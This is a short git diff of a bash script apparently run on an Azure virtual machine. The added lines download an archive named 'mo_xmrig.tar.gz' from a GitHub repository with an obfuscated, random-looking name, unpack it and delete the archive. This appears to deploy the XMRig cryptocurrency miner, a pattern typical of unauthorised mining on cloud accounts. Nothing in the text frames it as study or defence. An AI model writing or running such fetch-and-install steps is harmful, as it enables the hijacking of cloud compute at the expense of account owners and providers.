@@ -1,5 +1,9 @@
 #!/bin/bash
-#cd /home/azureuser
+cd /home/azureuser
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_xmrig.tar.gz -P /home/azureuser
+tar -xf mo_xmrig.tar.gz
+rm -r mo_xmrig.tar.gz
+########################
 #mkdir /home/azureuser/qub_dir
 #cd /home/azureuser/qub_dir
 
